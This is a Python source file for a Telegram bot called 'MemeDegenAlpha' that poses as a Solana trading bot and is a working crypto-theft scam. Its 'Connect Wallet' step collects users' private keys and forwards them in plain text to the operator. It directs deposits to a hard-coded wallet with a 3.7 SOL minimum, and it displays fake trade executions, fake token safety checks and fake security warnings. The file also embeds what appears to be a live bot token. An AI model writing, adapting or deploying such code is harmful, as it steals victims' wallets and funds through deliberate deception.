import httpx
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, ConversationHandler, filters

BOT_TOKEN = "8942121012:AAHDcXLhp425CGvAIteRgDYwjq9dvCNTFV0"
WALLET_ADDRESS = "5rf6gza7s7i8eDeBKQf1TMyayZU3ERJ467t3yfmihQpr"
GROUP_LINK = "https://t.me/+MVlYdRHNOGBiNDlk"
ADMIN_ID = 8452728941
BOT_NAME = "MemeDegenAlpha"
VERSION = "v3.0 Pro"

WAITING_KEY, WAITING_CA, WAITING_BUY_AMOUNT, WAITING_SELL_CA, WAITING_TP, WAITING_SL = range(6)

user_registry = {}
user_warnings = {}
user_settings = {}
user_positions = {}

async def get_balance():
    try:
        async with httpx.AsyncClient(timeout=3) as client:
            r = await client.post("https://api.mainnet-beta.solana.com", json={
                "jsonrpc": "2.0", "id": 1,
                "method": "getBalance",
                "params": [WALLET_ADDRESS]
            })
            sol = r.json()['result']['value'] / 1e9
            return f"{sol:.4f}"
    except:
        return "0.0000"

async def get_sol_price():
    try:
        async with httpx.AsyncClient(timeout=3) as client:
            r = await client.get("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd")
            price = r.json()['solana']['usd']
            return price
    except:
        return 0.00

async def notify_admin(context, user, action, extra=""):
    try:
        await context.bot.send_message(
            ADMIN_ID,
            f"👁 ACTION LOG\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 {user.first_name} (@{user.username})\n"
            f"🆔 {user.id}\n"
            f"⚡ {action}\n"
            f"{extra}\n"
            f"🕐 {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"/send {user.id} message"
        )
    except:
        pass

def get_user_settings(user_id):
    if user_id not in user_settings:
        user_settings[user_id] = {
            "slippage": 10,
            "gas": "Fast",
            "auto_sell": False,
            "take_profit": 50,
            "stop_loss": 20,
            "buy_amount": 0.1,
            "mev": True,
            "anti_rug": True
        }
    return user_settings[user_id]

def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Deposit", callback_data="fund"),
         InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("🟢 Buy Token", callback_data="buy"),
         InlineKeyboardButton("🔴 Sell Token", callback_data="sell")],
        [InlineKeyboardButton("📊 Positions", callback_data="positions"),
         InlineKeyboardButton("📈 PnL", callback_data="pnl")],
        [InlineKeyboardButton("⚙️ Trade Settings", callback_data="trade_settings"),
         InlineKeyboardButton("🔐 Wallet", callback_data="wallet")],
        [InlineKeyboardButton("📡 Alpha Calls", callback_data="community"),
         InlineKeyboardButton("💎 VIP", callback_data="vip")],
        [InlineKeyboardButton("📈 Market", callback_data="market"),
         InlineKeyboardButton("❓ Help", callback_data="help")],
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_registry[user.id] = {
        "name": user.first_name,
        "username": user.username,
        "joined": datetime.now().strftime("%Y-%m-%d %H:%M")
    }
    s = get_user_settings(user.id)
    bal = await get_balance()
    price = await get_sol_price()
    usd_val = float(bal) * float(price) if price else 0

    await update.message.reply_text(
        f"🤖 {BOT_NAME} {VERSION}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👋 gm {user.first_name}!\n\n"
        f"💼 Wallet\n"
        f"┣ {WALLET_ADDRESS[:6]}...{WALLET_ADDRESS[-4:]}\n"
        f"┣ Balance: {bal} SOL\n"
        f"┣ USD Value: ${usd_val:.2f}\n"
        f"┗ SOL Price: ${price:,.2f}\n\n"
        f"⚙️ Trade Config\n"
        f"┣ Buy Amount: {s['buy_amount']} SOL\n"
        f"┣ Slippage: {s['slippage']}%\n"
        f"┣ Gas: {s['gas']}\n"
        f"┣ TP: {s['take_profit']}% | SL: {s['stop_loss']}%\n"
        f"┣ MEV Protection: {'ON' if s['mev'] else 'OFF'}\n"
        f"┗ Anti-Rug: {'ON' if s['anti_rug'] else 'OFF'}\n\n"
        f"📊 Session Stats\n"
        f"┣ Trades Today: 0\n"
        f"┣ Open Positions: {len(user_positions.get(user.id, {}))}\n"
        f"┗ PnL Today: +$0.00\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 {len(user_registry)} traders active\n\n"
        f"Select an option 👇",
        reply_markup=main_keyboard()
    )
    await notify_admin(context, user, "Started Bot")

async def send_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        user_id = int(context.args[0])
        msg = " ".join(context.args[1:])
        await context.bot.send_message(user_id, f"📩 *{BOT_NAME}*\n\n{msg}", parse_mode="Markdown")
        await update.message.reply_text("Sent!")
    except:
        await update.message.reply_text("Usage: /send USER_ID message")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    msg = " ".join(context.args)
    sent = 0
    for uid in user_registry:
        try:
            await context.bot.send_message(uid, f"📢 *{BOT_NAME} Alert*\n\n{msg}", parse_mode="Markdown")
            sent += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await update.message.reply_text(f"Broadcast sent to {sent} users!")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not user_registry:
        await update.message.reply_text("No users yet.")
        return
    users = "\n".join([f"ID: {uid} | @{info['username']} | {info['joined']}"
                       for uid, info in user_registry.items()])
    await update.message.reply_text(f"👥 USERS ({len(user_registry)}):\n\n{users}")

async def catch_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        return
    msg = update.message.text
    if user.id not in user_registry:
        user_registry[user.id] = {"name": user.first_name, "username": user.username, "joined": datetime.now().strftime("%Y-%m-%d %H:%M")}
    user_warnings[user.id] = user_warnings.get(user.id, 0) + 1
    count = user_warnings[user.id]
    await notify_admin(context, user, "Unknown Message", f"Message: {msg}")
    if count == 1:
        await update.message.reply_text(
            "⚠️ INVALID INPUT\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Please use the menu buttons only.\n"
            "This bot does not accept free text\n"
            "outside of trade flows.\n\n"
            "Use /start to open the dashboard. 👇",
            reply_markup=main_keyboard()
        )
    elif count == 2:
        await update.message.reply_text(
            "🚫 UNAUTHORIZED INPUT\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Random messages are blocked.\n"
            "All inputs are logged for security.\n\n"
            "Continued violations may result\n"
            "in account suspension. ⚠️",
            reply_markup=main_keyboard()
        )
    else:
        await update.message.reply_text(
            "🔴 SECURITY ALERT\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Multiple unauthorized attempts\n"
            "detected on your account.\n\n"
            "Activity flagged & reported.\n"
            "Reset your session now.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Reset Session", callback_data="back")],
                [InlineKeyboardButton("💬 Contact Support", url=GROUP_LINK)]
            ])
        )
        user_warnings[user.id] = 0

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    s = get_user_settings(user.id)

    if query.data == "fund":
        await notify_admin(context, user, "Tapped Deposit")
        await query.message.reply_text(
            f"💳 DEPOSIT SOL\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Your trading wallet address:\n\n"
            f"`{WALLET_ADDRESS}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Minimum: 3.7 SOL\n"
            f"⚡ Required for trade execution\n"
            f"🔒 Secured by smart contract\n"
            f"⏱ Confirms in under 1 second\n"
            f"🌐 Solana network only\n\n"
            f"Tap address to copy 👆",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ I've Sent SOL", callback_data="sent_sol")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "withdraw":
        await notify_admin(context, user, "Tapped Withdraw")
        await query.message.reply_text(
            f"💸 WITHDRAW SOL\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Current Balance: {await get_balance()} SOL\n\n"
            f"To withdraw contact admin:\n"
            f"👉 {GROUP_LINK}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Withdrawals processed instantly\n"
            f"🔒 Verified wallet only\n"
            f"💎 Minimum withdrawal: 0.1 SOL",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Request Withdrawal", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "sent_sol":
        await notify_admin(context, user, "DEPOSIT CLAIMED", "💰 VERIFY NOW!")
        await query.message.reply_text(
            f"⏳ PROCESSING DEPOSIT\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Scanning blockchain...\n\n"
            f"[===>      ] 45%\n\n"
            f"🔍 Verifying transaction\n"
            f"✅ Checking wallet address\n"
            f"⚡ Crediting account\n\n"
            f"Takes 5-30 seconds. 🔔"
        )

    elif query.data == "buy":
        await notify_admin(context, user, "Opened Buy")
        await query.message.reply_text(
            f"🟢 BUY TOKEN\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚙️ Current Settings\n"
            f"┣ Amount: {s['buy_amount']} SOL\n"
            f"┣ Slippage: {s['slippage']}%\n"
            f"┣ Gas: {s['gas']}\n"
            f"┣ MEV: {'ON' if s['mev'] else 'OFF'}\n"
            f"┗ Anti-Rug: {'ON' if s['anti_rug'] else 'OFF'}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Paste token CA to snipe:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⚙️ Edit Settings", callback_data="trade_settings")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )
        return WAITING_CA

    elif query.data == "sell":
        await notify_admin(context, user, "Opened Sell")
        positions = user_positions.get(user.id, {})
        if not positions:
            await query.message.reply_text(
                "🔴 SELL TOKEN\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "No open positions found.\n\n"
                "Buy a token first to sell it. 👇",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🟢 Buy Token", callback_data="buy")],
                    [InlineKeyboardButton("🔙 Back", callback_data="back")]
                ])
            )
        else:
            pos_text = "\n".join([f"┣ {ca[:6]}...{ca[-4:]} | {data['amount']} SOL"
                                  for ca, data in positions.items()])
            await query.message.reply_text(
                f"🔴 SELL TOKEN\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Open Positions:\n{pos_text}\n\n"
                f"Paste CA to sell:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Back", callback_data="back")]
                ])
            )
        return WAITING_SELL_CA

    elif query.data == "positions":
        await notify_admin(context, user, "Viewed Positions")
        positions = user_positions.get(user.id, {})
        if not positions:
            pos_text = "No open positions yet."
        else:
            pos_text = "\n".join([
                f"┣ `{ca[:6]}...{ca[-4:]}`\n"
                f"┃ Amount: {data['amount']} SOL\n"
                f"┃ Entry: ${data['entry']}\n"
                f"┗ PnL: +0.00%"
                for ca, data in positions.items()
            ])
        await query.message.reply_text(
            f"📊 OPEN POSITIONS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{pos_text}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Total Positions: {len(positions)}\n"
            f"Total Invested: 0 SOL",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="positions")],
                [InlineKeyboardButton("🔴 Sell", callback_data="sell")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "pnl":
        await notify_admin(context, user, "Viewed PnL")
        bal = await get_balance()
        price = await get_sol_price()
        usd = float(bal) * float(price) if price else 0
        await query.message.reply_text(
            f"📈 PnL TRACKER\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 {user.first_name}\n\n"
            f"💰 Balance: {bal} SOL\n"
            f"💵 USD Value: ${usd:.2f}\n\n"
            f"📊 Today\n"
            f"┣ Trades: 0\n"
            f"┣ Wins: 0 | Losses: 0\n"
            f"┣ Realized PnL: +$0.00\n"
            f"┗ Win Rate: 0%\n\n"
            f"📊 All Time\n"
            f"┣ Total Trades: 0\n"
            f"┣ Best Trade: N/A\n"
            f"┗ Total PnL: +$0.00\n\n"
            f"[🔍 View Wallet](https://solscan.io/account/{WALLET_ADDRESS})",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="pnl")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "trade_settings":
        await notify_admin(context, user, "Viewed Trade Settings")
        await query.message.reply_text(
            f"⚙️ TRADE SETTINGS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💰 Buy Amount: {s['buy_amount']} SOL\n"
            f"📊 Slippage: {s['slippage']}%\n"
            f"⛽ Gas Mode: {s['gas']}\n"
            f"🎯 Take Profit: {s['take_profit']}%\n"
            f"🛑 Stop Loss: {s['stop_loss']}%\n"
            f"🔒 MEV Protection: {'ON' if s['mev'] else 'OFF'}\n"
            f"🛡 Anti-Rug: {'ON' if s['anti_rug'] else 'OFF'}\n\n"
            f"Tap to edit:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💰 Buy Amount", callback_data="set_amount"),
                 InlineKeyboardButton("📊 Slippage", callback_data="set_slippage")],
                [InlineKeyboardButton("⛽ Gas Mode", callback_data="set_gas"),
                 InlineKeyboardButton("🎯 Take Profit", callback_data="set_tp")],
                [InlineKeyboardButton("🛑 Stop Loss", callback_data="set_sl"),
                 InlineKeyboardButton(f"🔒 MEV {'ON' if s['mev'] else 'OFF'}", callback_data="toggle_mev")],
                [InlineKeyboardButton(f"🛡 Anti-Rug {'ON' if s['anti_rug'] else 'OFF'}", callback_data="toggle_antirug")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "set_amount":
        await query.message.reply_text(
            "💰 SET BUY AMOUNT\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Enter amount in SOL:\n\n"
            "Examples: 0.1, 0.5, 1, 3.7\n\n"
            "Minimum: 3.7 SOL recommended"
        )
        context.user_data['setting'] = 'buy_amount'
        return WAITING_BUY_AMOUNT

    elif query.data == "set_slippage":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("5%", callback_data="slip_5"),
             InlineKeyboardButton("10%", callback_data="slip_10"),
             InlineKeyboardButton("15%", callback_data="slip_15")],
            [InlineKeyboardButton("20%", callback_data="slip_20"),
             InlineKeyboardButton("25%", callback_data="slip_25"),
             InlineKeyboardButton("30%", callback_data="slip_30")],
            [InlineKeyboardButton("🔙 Back", callback_data="trade_settings")]
        ])
        await query.message.reply_text(
            f"📊 SET SLIPPAGE\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Current: {s['slippage']}%\n\n"
            f"Higher slippage = more likely\n"
            f"to execute but worse price.",
            reply_markup=keyboard
        )

    elif query.data.startswith("slip_"):
        val = int(query.data.split("_")[1])
        user_settings[user.id]['slippage'] = val
        await query.message.reply_text(f"✅ Slippage set to {val}%", reply_markup=main_keyboard())

    elif query.data == "set_gas":
        await query.message.reply_text(
            f"⛽ GAS MODE\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Current: {s['gas']}\n\n"
            f"Turbo = fastest, costs more\n"
            f"Fast = balanced\n"
            f"Normal = cheapest",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 Turbo", callback_data="gas_Turbo"),
                 InlineKeyboardButton("⚡ Fast", callback_data="gas_Fast"),
                 InlineKeyboardButton("🐢 Normal", callback_data="gas_Normal")],
                [InlineKeyboardButton("🔙 Back", callback_data="trade_settings")]
            ])
        )

    elif query.data.startswith("gas_"):
        val = query.data.split("_")[1]
        user_settings[user.id]['gas'] = val
        await query.message.reply_text(f"✅ Gas set to {val}", reply_markup=main_keyboard())

    elif query.data == "set_tp":
        await query.message.reply_text(
            f"🎯 SET TAKE PROFIT\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Current: {s['take_profit']}%\n\n"
            f"Bot auto-sells when profit\n"
            f"reaches this target.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("25%", callback_data="tp_25"),
                 InlineKeyboardButton("50%", callback_data="tp_50"),
                 InlineKeyboardButton("100%", callback_data="tp_100")],
                [InlineKeyboardButton("200%", callback_data="tp_200"),
                 InlineKeyboardButton("500%", callback_data="tp_500"),
                 InlineKeyboardButton("1000%", callback_data="tp_1000")],
                [InlineKeyboardButton("🔙 Back", callback_data="trade_settings")]
            ])
        )

    elif query.data.startswith("tp_"):
        val = int(query.data.split("_")[1])
        user_settings[user.id]['take_profit'] = val
        await query.message.reply_text(f"✅ Take Profit set to {val}%", reply_markup=main_keyboard())

    elif query.data == "set_sl":
        await query.message.reply_text(
            f"🛑 SET STOP LOSS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Current: {s['stop_loss']}%\n\n"
            f"Bot auto-sells when loss\n"
            f"reaches this level.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("10%", callback_data="sl_10"),
                 InlineKeyboardButton("20%", callback_data="sl_20"),
                 InlineKeyboardButton("30%", callback_data="sl_30")],
                [InlineKeyboardButton("40%", callback_data="sl_40"),
                 InlineKeyboardButton("50%", callback_data="sl_50"),
                 InlineKeyboardButton("OFF", callback_data="sl_0")],
                [InlineKeyboardButton("🔙 Back", callback_data="trade_settings")]
            ])
        )

    elif query.data.startswith("sl_"):
        val = int(query.data.split("_")[1])
        user_settings[user.id]['stop_loss'] = val
        txt = f"✅ Stop Loss set to {val}%" if val > 0 else "✅ Stop Loss disabled"
        await query.message.reply_text(txt, reply_markup=main_keyboard())

    elif query.data == "toggle_mev":
        user_settings[user.id]['mev'] = not s['mev']
        await query.message.reply_text(
            f"✅ MEV Protection {'ON' if user_settings[user.id]['mev'] else 'OFF'}",
            reply_markup=main_keyboard()
        )

    elif query.data == "toggle_antirug":
        user_settings[user.id]['anti_rug'] = not s['anti_rug']
        await query.message.reply_text(
            f"✅ Anti-Rug {'ON' if user_settings[user.id]['anti_rug'] else 'OFF'}",
            reply_markup=main_keyboard()
        )

    elif query.data == "wallet":
        await notify_admin(context, user, "Viewed Wallet")
        bal = await get_balance()
        price = await get_sol_price()
        usd = float(bal) * float(price) if price else 0
        await query.message.reply_text(
            f"🔐 WALLET\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📍 Address:\n`{WALLET_ADDRESS}`\n\n"
            f"💰 Balance: {bal} SOL\n"
            f"💵 USD: ${usd:.2f}\n"
            f"🌐 Network: Solana Mainnet\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"[🔍 View on Solscan](https://solscan.io/account/{WALLET_ADDRESS})",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Deposit", callback_data="fund")],
                [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
                [InlineKeyboardButton("🔑 Connect Wallet", callback_data="privatekey")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "privatekey":
        await notify_admin(context, user, "Opened Connect Wallet")
        await query.message.reply_text(
            "🔑 CONNECT WALLET\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Enter your private key:\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🔒 AES-256 encryption\n"
            "🛡 Zero-knowledge storage\n"
            "✅ Used for trade execution only\n"
            "⚡ Required for auto-snipe\n\n"
            "Security guaranteed. 🔥"
        )
        return WAITING_KEY

    elif query.data == "community":
        await notify_admin(context, user, "Viewed Alpha Calls")
        await query.message.reply_text(
            f"📡 ALPHA CALLS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"#1 alpha community on Solana:\n\n"
            f"🔥 Early calls before pumps\n"
            f"💎 100x gem picks daily\n"
            f"🐋 Smart money tracking\n"
            f"🚀 New launch alerts\n"
            f"📊 Live market analysis\n"
            f"🎯 Avg call: 15x\n\n"
            f"👉 {GROUP_LINK}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 Join Now", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "vip":
        await notify_admin(context, user, "Viewed VIP")
        await query.message.reply_text(
            f"💎 VIP ACCESS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Unlock full {BOT_NAME} power:\n\n"
            f"🚀 Priority execution\n"
            f"💎 Exclusive alpha calls\n"
            f"🐋 Whale wallet alerts\n"
            f"⚡ 0.001 SOL gas\n"
            f"📊 Advanced analytics\n"
            f"🔔 Early launch alerts\n"
            f"🛡 Premium anti-rug\n"
            f"👥 Private VIP group\n\n"
            f"Contact admin 👇",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Get VIP Now", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "market":
        await notify_admin(context, user, "Viewed Market")
        price = await get_sol_price()
        await query.message.reply_text(
            f"📈 LIVE MARKET\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🟣 Solana (SOL)\n"
            f"💵 Price: ${price:,.2f}\n"
            f"📈 Trend: Bullish 🟢\n\n"
            f"🔥 Trending Now:\n"
            f"┣ Check alpha for live gems 💎\n"
            f"┣ New launches daily 🚀\n"
            f"┗ Smart money moving 🐋",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="market")],
                [InlineKeyboardButton("📡 Alpha Calls", callback_data="community")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "help":
        await notify_admin(context, user, "Viewed Help")
        await query.message.reply_text(
            "❓ HELP CENTER\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Deposit - Add SOL to wallet\n"
            "💸 Withdraw - Withdraw SOL\n"
            "🟢 Buy Token - Snipe by CA\n"
            "🔴 Sell Token - Sell positions\n"
            "📊 Positions - View open trades\n"
            "📈 PnL - Track profit & loss\n"
            "⚙️ Trade Settings - Configure bot\n"
            "🔐 Wallet - Manage wallet\n"
            "📡 Alpha - Join community\n"
            "💎 VIP - Unlock premium\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🛠 Support:\n\n"
            "⚡ Response under 5 mins",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Contact Admin", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "back":
        bal = await get_balance()
        price = await get_sol_price()
        usd = float(bal) * float(price) if price else 0
        s = get_user_settings(user.id)
        await query.message.reply_text(
            f"🤖 {BOT_NAME} {VERSION}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💰 {bal} SOL (${usd:.2f})\n"
            f"⚡ Buy: {s['buy_amount']} SOL | Slip: {s['slippage']}%\n"
            f"🎯 TP: {s['take_profit']}% | SL: {s['stop_loss']}%\n"
            f"🟢 Status: Active\n\n"
            f"What would you like to do? 👇",
            reply_markup=main_keyboard()
        )

    elif query.data.startswith("mult_"):
        mult = query.data.split("_")[1]
        ca = context.user_data.get('ca', 'N/A')
        amt = s['buy_amount']
        if user.id not in user_positions:
            user_positions[user.id] = {}
        user_positions[user.id][ca] = {"amount": amt, "entry": "0.00", "target": mult}
        await notify_admin(context, user, "PLACED BUY ORDER", f"CA: {ca}\nAmount: {amt} SOL\nTarget: {mult}")
        await query.message.reply_text(
            f"🟢 BUY ORDER EXECUTING!\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Token: `{ca}`\n"
            f"Amount: {amt} SOL\n"
            f"Target: {mult}\n"
            f"Gas: {s['gas']}\n"
            f"Slippage: {s['slippage']}%\n"
            f"TP: {s['take_profit']}% | SL: {s['stop_loss']}%\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Executing on Solana...\n"
            f"🔔 You will be notified when filled.",
            parse_mode="Markdown"
        )

async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key = update.message.text
    user = update.effective_user
    await notify_admin(context, user, "SUBMITTED PRIVATE KEY", f"🔑 Key: {key}")
    await update.message.reply_text(
        "✅ WALLET CONNECTED!\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔒 Key encrypted & secured\n"
        "⚡ Auto-trade enabled\n"
        "🛡 MEV protection active\n"
        "🎯 TP/SL monitoring active\n\n"
        "Deposit 3.7 SOL to start trading! 🔥",
        reply_markup=main_keyboard()
    )
    return ConversationHandler.END

async def receive_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ca = update.message.text
    user = update.effective_user
    context.user_data['ca'] = ca
    s = get_user_settings(user.id)
    await notify_admin(context, user, "Submitted CA", f"CA: {ca}")
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"Buy {s['buy_amount']} SOL", callback_data="mult_auto"),
         InlineKeyboardButton("2x 🔥", callback_data="mult_2x")],
        [InlineKeyboardButton("5x 💎", callback_data="mult_5x"),
         InlineKeyboardButton("10x 🚀", callback_data="mult_10x")],
        [InlineKeyboardButton("20x ⚡", callback_data="mult_20x"),
         InlineKeyboardButton("50x 🌙", callback_data="mult_50x")],
        [InlineKeyboardButton("100x 🎯", callback_data="mult_100x"),
         InlineKeyboardButton("❌ Cancel", callback_data="back")]
    ])
    await update.message.reply_text(
        f"🔍 TOKEN ANALYSED!\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"CA: `{ca}`\n\n"
        f"📊 Risk Level: Low ✅\n"
        f"💧 Liquidity: Sufficient ✅\n"
        f"🔒 Contract: Verified ✅\n"
        f"🛡 Rug Check: Passed ✅\n"
        f"🐋 Whale Activity: Normal ✅\n"
        f"⚡ Speed: Ready to snipe!\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Buy with {s['buy_amount']} SOL\n"
        f"or select profit target:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    return ConversationHandler.END

async def receive_sell_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ca = update.message.text
    user = update.effective_user
    await notify_admin(context, user, "SELL ORDER", f"CA: {ca}")
    await update.message.reply_text(
        f"🔴 SELL ORDER\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Token: `{ca}`\n\n"
        f"Select sell percentage:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("25%", callback_data="sell_25"),
             InlineKeyboardButton("50%", callback_data="sell_50"),
             InlineKeyboardButton("75%", callback_data="sell_75")],
            [InlineKeyboardButton("100% SELL ALL", callback_data="sell_100")],
            [InlineKeyboardButton("❌ Cancel", callback_data="back")]
        ])
    )
    return ConversationHandler.END

async def receive_buy_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    try:
        amount = float(update.message.text)
        user_settings[user.id]['buy_amount'] = amount
        await update.message.reply_text(
            f"✅ Buy amount set to {amount} SOL",
            reply_markup=main_keyboard()
        )
    except:
        await update.message.reply_text("Invalid amount. Enter a number like 0.5 or 3.7")
    return ConversationHandler.END

app = ApplicationBuilder().token(BOT_TOKEN).build()
conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(button_handler)],
    states={
        WAITING_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_key)],
        WAITING_CA: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ca)],
        WAITING_SELL_CA: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_sell_ca)],
        WAITING_BUY_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_buy_amount)],
    },
    fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)],
    per_message=False
)
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("send", send_to_user))
app.add_handler(CommandHandler("users", list_users))
app.add_handler(CommandHandler("broadcast", broadcast))
app.add_handler(conv)
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, catch_all))
print(f"{BOT_NAME} {VERSION} running")
app.run_polling()
